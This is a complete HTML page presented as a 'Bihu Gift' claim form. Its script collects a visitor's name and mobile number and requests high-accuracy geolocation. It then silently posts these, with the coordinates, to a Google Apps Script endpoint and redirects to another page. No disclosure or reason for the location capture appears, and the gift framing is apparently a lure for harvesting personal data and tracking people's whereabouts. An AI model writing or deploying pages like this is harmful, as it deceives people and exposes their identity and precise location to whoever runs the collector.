<!-- index.html -->
<!DOCTYPE html>
<html>
<head>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Bihu Gift</title>
</head>
<body>

<form id="studentForm">
  <input name="name" placeholder="Name" required>
  <input name="reason" placeholder="Gift type" required>
  <input name="mobile" placeholder="Mobile" required>
  <button type="submit">Received Gift üéÅ</button>
  <p id="status"></p>
</form>

<script>
const form = document.getElementById("studentForm");
const statusText = document.getElementById("status");

form.addEventListener("submit", function(e){
  e.preventDefault();
  statusText.innerText = "Requesting location‚Ä¶";

  navigator.geolocation.getCurrentPosition(
    pos => sendData(pos),
    err => sendData(null),
    { enableHighAccuracy:true, timeout:15000 }
  );
});

function sendData(position){
  const data = {
    name: form.name.value,
    reason: form.reason.value,
    mobile: form.mobile.value,
    latitude: position ? position.coords.latitude : "",
    longitude: position ? position.coords.longitude : "",
    accuracy: position ? position.coords.accuracy : ""
  };

  fetch("https://script.google.com/macros/s/AKfycbz3rQv9nyn-B_NNyy2Vyj6WN2hZcsFgpncziEsCGhn4sB-Cwm-gP52RnvphqzH1QxCL/exec",{
    method:"POST",
    mode:"no-cors",
    headers:{ "Content-Type":"application/json" },
    body: JSON.stringify(data)
  });

  window.location.href="bihuz.html";
}
</script>

</body>
</html>

